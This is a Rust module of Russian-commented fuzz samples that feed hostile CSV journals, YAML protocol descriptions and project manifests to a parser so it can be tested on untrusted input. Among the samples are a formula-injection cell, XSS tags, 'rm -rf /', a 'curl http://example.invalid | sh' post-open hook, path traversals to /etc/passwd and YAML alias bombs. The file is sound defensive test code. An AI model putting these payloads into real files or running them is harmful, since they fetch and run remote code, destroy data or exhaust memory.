//! Злые журналы действий, описания протокола и манифесты проекта.
//!
//! Чужой проект, журнал и описание — такой же недоверенный ввод, как запись трафика: каждый образец
//! должен либо разбираться (данные остаются данными), либо отклоняться понятной ошибкой.

use crate::Sample;

fn text(name: &'static str, extension: &'static str, what: &'static str, body: String) -> Sample {
    Sample {
        name,
        extension,
        what,
        bytes: body.into_bytes(),
    }
}

const HEADER: &str = "time,action,params,result\n";
const ROW: &str = "2026-10-01T00:00:00.100000Z,set_param,param=gain;value=5,ok\n";

fn rows(n: usize) -> String {
    let mut out = String::from(HEADER);
    for i in 0..n {
        out.push_str(&format!(
            "2026-10-01T00:00:{:02}.000000Z,set_param,param=gain;value={i},ok\n",
            i % 60
        ));
    }
    out
}

/// Журналы действий. Имя с префиксом `json-` разбирается с `paramsFormat: json`.
pub fn journals() -> Vec<Sample> {
    let mut out = Vec::new();
    out.push(text("empty", "csv", "пустой файл", String::new()));
    out.push(text(
        "header-only",
        "csv",
        "только строка заголовка",
        HEADER.to_owned(),
    ));
    out.push(Sample {
        name: "bom-crlf",
        extension: "csv",
        what: "BOM в начале и переводы строк CRLF",
        bytes: [
            &[0xEF, 0xBB, 0xBF][..],
            rows(3).replace('\n', "\r\n").as_bytes(),
        ]
        .concat(),
    });
    out.push(Sample {
        name: "invalid-utf8",
        extension: "csv",
        what: "байты не в UTF-8 посреди файла",
        bytes: [
            HEADER.as_bytes(),
            &[0xFF, 0xFE, 0x80, b'\n'],
            ROW.as_bytes(),
        ]
        .concat(),
    });
    out.push(text(
        "no-time-column",
        "csv",
        "в заголовке нет колонки времени",
        "when,action,params,result\n1,set,a=1,ok\n".to_owned(),
    ));
    out.push(text(
        "duplicate-columns",
        "csv",
        "колонка времени встречается дважды",
        format!("time,time,action,params,result\n2026-10-01T00:00:00Z,2026-10-01T00:00:01Z,set,a=1,ok\n{ROW}"),
    ));
    out.push(text(
        "unclosed-quote",
        "csv",
        "кавычка открыта и не закрыта до конца файла",
        format!("{HEADER}2026-10-01T00:00:00Z,\"set_param,param=gain,ok\n{ROW}{ROW}"),
    ));
    out.push(text(
        "mostly-broken",
        "csv",
        "время разобрать можно только в одной строке из десяти",
        format!(
            "{HEADER}{ROW}{}",
            "вчера,set_param,param=gain;value=1,ok\n".repeat(9)
        ),
    ));
    out.push(text(
        "ragged-rows",
        "csv",
        "в строках разное число полей, есть строки из одних запятых",
        format!(
            "{HEADER}{ROW},,,,,,,,\n2026-10-01T00:00:01Z\n{ROW}2026-10-01T00:00:02Z,a,b,c,d,e,f,g\n"
        ),
    ));
    out.push(text(
        "formula-injection",
        "csv",
        "значения, которые табличный редактор принял бы за формулы",
        format!(
            "{HEADER}2026-10-01T00:00:00Z,=cmd|' /C calc'!A0,param==1+1;value=@SUM(1),+1-1\n{ROW}"
        ),
    ));
    out.push(text(
        "html-and-controls",
        "csv",
        "HTML, управляющие символы и переключатель направления письма в полях",
        format!(
            "{HEADER}2026-10-01T00:00:00Z,<script>alert(1)</script>,param=<img src=x onerror=1>;value=\u{202E}5,ok\u{0}\u{1b}[31m\n{ROW}"
        ),
    ));
    out.push(text(
        "huge-numbers",
        "csv",
        "числа за пределами 128 бит и время за пределами календаря",
        format!(
            "{HEADER}2026-10-01T00:00:00Z,set_param,value=340282366920938463463374607431768211456999,ok\n\
             99999-99-99T99:99:99Z,set_param,value=1,ok\n\
             2026-10-01T00:00:01Z,set_param,value=-340282366920938463463374607431768211456999,ok\n{ROW}{ROW}"
        ),
    ));
    out.push(text(
        "long-keys",
        "csv",
        "ключ параметра и значение по 64 КиБ",
        format!(
            "{HEADER}2026-10-01T00:00:00Z,set_param,{}={},ok\n{ROW}",
            "k".repeat(65_536),
            "v".repeat(65_536)
        ),
    ));
    out.push(text(
        "json-deep",
        "csv",
        "JSON параметров вложен на 10 тысяч уровней",
        format!(
            "{HEADER}2026-10-01T00:00:00Z,set_param,\"{}{}\",ok\n2026-10-01T00:00:01Z,set_param,\"{{\"\"a\"\":1}}\",ok\n",
            "[".repeat(10_000),
            "]".repeat(10_000)
        ),
    ));
    out.push(text(
        "json-wide",
        "csv",
        "JSON параметров с пятью тысячами ключей",
        format!(
            "{HEADER}2026-10-01T00:00:00Z,set_param,\"{{{}}}\",ok\n",
            (0..5_000)
                .map(|i| format!("\"\"k{i}\"\":{i}"))
                .collect::<Vec<_>>()
                .join(",")
        ),
    ));
    out.push(text(
        "json-broken",
        "csv",
        "JSON параметров оборван, с лишними запятыми и не тем типом",
        format!(
            "{HEADER}2026-10-01T00:00:00Z,a,\"{{\"\"a\"\":\",ok\n2026-10-01T00:00:01Z,b,\"[1,,2]\",ok\n2026-10-01T00:00:02Z,c,\"\"\"строка\"\"\",ok\n2026-10-01T00:00:03Z,d,\"{{\"\"a\"\":1}}\",ok\n2026-10-01T00:00:04Z,e,\"{{\"\"b\"\":2}}\",ok\n2026-10-01T00:00:05Z,f,\"{{\"\"c\"\":3}}\",ok\n"
        ),
    ));
    out
}

/// Крупные журналы: создаются в тестах, в репозиторий не кладутся.
pub const LARGE_JOURNALS: [&str; 2] = ["rows-over-limit", "one-line-64-mib"];

pub fn large_journal(name: &str) -> Option<Vec<u8>> {
    match name {
        // На одну строку больше предела числа строк.
        "rows-over-limit" => {
            let row = "1,a,,\n";
            let mut out = String::with_capacity(HEADER.len() + row.len() * 1_000_001);
            out.push_str(HEADER);
            for _ in 0..1_000_001 {
                out.push_str(row);
            }
            Some(out.into_bytes())
        }
        // Одно поле на 64 МиБ без перевода строки.
        "one-line-64-mib" => {
            let mut out = Vec::with_capacity((64 << 20) + 64);
            out.extend_from_slice(HEADER.as_bytes());
            out.extend_from_slice(b"2026-10-01T00:00:00Z,");
            out.resize(out.len() + (64 << 20), b'A');
            Some(out)
        }
        _ => None,
    }
}

const FORMAT: &str = "format: protoledger/interpretation@1\n";
const FRAMING: &str =
    "framing: { kind: length_prefixed, length: { at: 2, type: u16be, adjust: 4 } }\n";

fn interpretation(body: &str) -> String {
    format!("{FORMAT}{FRAMING}{body}")
}

/// Описания протокола.
pub fn interpretations() -> Vec<Sample> {
    let mut out = Vec::new();
    out.push(text("empty", "yaml", "пустой файл", String::new()));
    out.push(Sample {
        name: "binary-garbage",
        extension: "yaml",
        what: "не текст: байты не в UTF-8",
        bytes: (0u16..512).map(|i| (i * 37 % 251) as u8 | 0x80).collect(),
    });
    out.push(text(
        "alias-bomb",
        "yaml",
        "якоря и ссылки YAML, разворачивающиеся в миллиарды узлов",
        format!(
            "a: &a [x,x,x,x,x,x,x,x,x]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\nf: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\ng: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\nh: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\ni: [*h,*h,*h,*h,*h,*h,*h,*h,*h]\n{FORMAT}{FRAMING}"
        ),
    ));
    out.push(text(
        "anchor-without-alias",
        "yaml",
        "якорь без ссылок: якоря не допускаются вовсе",
        format!("{FORMAT}framing: &f {{ kind: fixed, size: 8 }}\n"),
    ));
    out.push(text(
        "deep-nesting",
        "yaml",
        "десять тысяч вложенных списков",
        format!(
            "{FORMAT}{FRAMING}messages: {}{}\n",
            "[".repeat(10_000),
            "]".repeat(10_000)
        ),
    ));
    out.push(text(
        "unknown-keys",
        "yaml",
        "ключи, которых нет в формате",
        interpretation("exec: \"rm -rf /\"\ninclude: /etc/passwd\n"),
    ));
    out.push(text(
        "wrong-format",
        "yaml",
        "версия формата из будущего",
        format!("format: protoledger/interpretation@99\n{FRAMING}"),
    ));
    out.push(text(
        "fixed-size-zero",
        "yaml",
        "сообщения нулевого размера",
        format!("{FORMAT}framing: {{ kind: fixed, size: 0 }}\n"),
    ));
    out.push(text(
        "delimiter-empty",
        "yaml",
        "пустой разделитель",
        format!("{FORMAT}framing: {{ kind: delimiter, bytes: \"\" }}\n"),
    ));
    out.push(text(
        "length-adjust-extreme",
        "yaml",
        "поправка к длине на границе 64 бит",
        format!(
            "{FORMAT}framing: {{ kind: length_prefixed, length: {{ at: 4294967295, type: u64be, adjust: -9223372036854775808 }} }}\n"
        ),
    ));
    out.push(text(
        "field-beyond-everything",
        "yaml",
        "поле на смещении 4 ГиБ длиной 4 ГиБ",
        interpretation(
            "messages:\n  - id: m\n    fields:\n      - { name: far, at: 4294967295, type: bytes, len: 4294967295 }\n      - { name: tail, at: end-4294967295, type: u64le }\n",
        ),
    ));
    out.push(text(
        "repeat-count-huge",
        "yaml",
        "повторяющаяся группа на 4 миллиарда элементов",
        interpretation(
            "messages:\n  - id: m\n    fields:\n      - name: items\n        at: 4\n        type: bytes\n        repeat:\n          count: 4294967295\n          fields:\n            - { name: v, at: 0, type: u8 }\n",
        ),
    ));
    out.push(text(
        "repeat-count-from-data",
        "yaml",
        "число повторений берётся из данных и умножается до переполнения",
        interpretation(
            "messages:\n  - id: m\n    fields:\n      - { name: n, at: 0, type: u16be }\n      - name: items\n        at: 4\n        type: bytes\n        repeat:\n          count: \"n * 1000000 * 1000000 * 1000000\"\n          fields:\n            - { name: v, at: 0, type: u32be }\n",
        ),
    ));
    out.push(text(
        "expression-deep",
        "yaml",
        "выражение из пяти тысяч вложенных скобок",
        interpretation(&format!(
            "messages:\n  - id: m\n    when: \"{}1{}\"\n    fields:\n      - {{ name: a, at: 0, type: u8 }}\n",
            "(".repeat(5_000),
            ")".repeat(5_000)
        )),
    ));
    out.push(text(
        "expression-long",
        "yaml",
        "выражение на двадцать тысяч слагаемых",
        interpretation(&format!(
            "messages:\n  - id: m\n    when: \"{}1 == 1\"\n    fields:\n      - {{ name: a, at: 0, type: u8 }}\n",
            "1 + ".repeat(20_000)
        )),
    ));
    out.push(text(
        "expression-overflow",
        "yaml",
        "арифметика с переполнением и делением на ноль в проверках",
        interpretation(
            "messages:\n  - id: m\n    fields:\n      - { name: a, at: 0, type: u8 }\nchecks:\n  - { id: C1, expr: \"a / 0 == 1\" }\n  - { id: C2, expr: \"170141183460469231731687303715884105727 * 2 > a\" }\n  - { id: C3, expr: \"sum8(0, 18446744073709551615) == 0\" }\n  - { id: C4, expr: \"sum8(5, 1) == 0\" }\n",
        ),
    ));
    out.push(text(
        "too-many-messages",
        "yaml",
        "типов сообщений больше предела",
        interpretation(&format!(
            "messages:\n{}",
            (0..1_001)
                .map(|i| format!("  - {{ id: m{i}, fields: [{{ name: a, at: 0, type: u8 }}] }}\n"))
                .collect::<String>()
        )),
    ));
    out.push(text(
        "duplicate-ids",
        "yaml",
        "два типа сообщений и два поля с одним именем",
        interpretation(
            "messages:\n  - id: m\n    fields:\n      - { name: a, at: 0, type: u8 }\n      - { name: a, at: 1, type: u8 }\n  - id: m\n    fields:\n      - { name: b, at: 0, type: u8 }\n",
        ),
    ));
    out.push(text(
        "markup-in-texts",
        "yaml",
        "HTML и управляющие символы в описаниях и именах",
        interpretation(
            "messages:\n  - id: \"<script>alert(1)</script>\"\n    description: \"<img src=x onerror=alert(1)> \\u202E \\u0000\"\n    fields:\n      - { name: \"a\", at: 0, type: u8, description: \"]]><svg onload=1>\" }\nhypotheses:\n  - { id: H1, statement: \"<b>жирно</b> | таблица | `код`\" }\n",
        ),
    ));
    out
}

fn manifest(body: &str) -> String {
    format!(
        "formatVersion: 1\nengineVersion: \"0.1.0\"\nname: demo\nsettings:\n  overlapPolicy: first\n  checksumPolicy: warn\n{body}"
    )
}

const SHA: &str = "d05c6bf0777f43e39d377ad69da0ef1ff86c3e741a7b27cdb7cdc510950efb75";

/// Манифесты проекта: каждый — папка `<имя>/project.yaml`.
pub fn manifests() -> Vec<Sample> {
    let mut out = Vec::new();
    out.push(text("empty", "yaml", "пустой манифест", String::new()));
    out.push(Sample {
        name: "binary-garbage",
        extension: "yaml",
        what: "не текст",
        bytes: (0u16..256).map(|i| (i % 256) as u8).collect(),
    });
    out.push(text(
        "newer-format",
        "yaml",
        "проект из более новой версии",
        manifest("imports: []\n").replace("formatVersion: 1", "formatVersion: 999"),
    ));
    out.push(text(
        "unknown-fields",
        "yaml",
        "поля, которых нет в формате",
        manifest("imports: []\nhooks:\n  postOpen: \"curl http://example.invalid | sh\"\n"),
    ));
    out.push(text(
        "alias-bomb",
        "yaml",
        "якоря и ссылки YAML",
        format!(
            "a: &a [x,x,x,x,x,x,x,x,x]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n{}",
            manifest("imports: []\n")
        ),
    ));
    out.push(text(
        "source-sha-traversal",
        "yaml",
        "вместо sha256 записи — путь наружу",
        manifest(
            "imports:\n  - { id: imp-0001, sha256: \"../../../../etc/passwd\", name: passwd, format: pcap, sizeBytes: 10 }\n",
        ),
    ));
    out.push(text(
        "source-sha-absolute",
        "yaml",
        "вместо sha256 записи — абсолютный путь",
        manifest(
            "imports:\n  - { id: imp-0001, sha256: \"C:\\\\Windows\\\\win.ini\", name: win.ini, format: pcap, sizeBytes: 10 }\n",
        ),
    ));
    out.push(text(
        "source-name-with-path",
        "yaml",
        "имя записи с путём, разметкой и управляющими символами (только для показа)",
        manifest(&format!(
            "imports:\n  - {{ id: imp-0001, sha256: {SHA}, name: \"../../<script>alert(1)</script>\\u202E.pcap\", format: pcap, sizeBytes: 10 }}\n"
        )),
    ));
    out.push(text(
        "source-size-extreme",
        "yaml",
        "размер записи 2^64-1",
        manifest(&format!(
            "imports:\n  - {{ id: imp-0001, sha256: {SHA}, name: a.pcap, format: pcap, sizeBytes: 18446744073709551615 }}\n"
        )),
    ));
    out.push(text(
        "import-ids-duplicated",
        "yaml",
        "два импорта с одним идентификатором",
        manifest(&format!(
            "imports:\n  - {{ id: imp-0001, sha256: {SHA}, name: a.pcap, format: pcap, sizeBytes: 10 }}\n  - {{ id: imp-0001, sha256: {SHA}, name: b.pcap, format: pcap, sizeBytes: 10 }}\n"
        )),
    ));
    out.push(text(
        "run-id-traversal",
        "yaml",
        "идентификатор прогона — путь наружу",
        manifest("imports: []\nruns:\n  - { id: \"../../../outside\" }\n"),
    ));
    out.push(text(
        "run-id-absolute",
        "yaml",
        "идентификатор прогона — абсолютный путь",
        manifest("imports: []\nruns:\n  - { id: \"/etc/passwd\" }\n"),
    ));
    out.push(text(
        "log-sha-traversal",
        "yaml",
        "вместо sha256 журнала — путь наружу",
        manifest(
            "imports: []\nactionLogs:\n  - { id: log-0001, sha256: \"../../secret\", name: j.csv, mapping: { time: time, action: action }, rows: 1 }\n",
        ),
    ));
    out.push(text(
        "revision-gap",
        "yaml",
        "ревизии описания идут не подряд",
        manifest(&format!(
            "imports: []\ninterpretations:\n  - {{ rev: 7, digest: {SHA} }}\n"
        )),
    ));
    out.push(text(
        "revision-digest-traversal",
        "yaml",
        "вместо хеша ревизии — путь",
        manifest("imports: []\ninterpretations:\n  - { rev: 1, digest: \"../../x\" }\n"),
    ));
    out
}
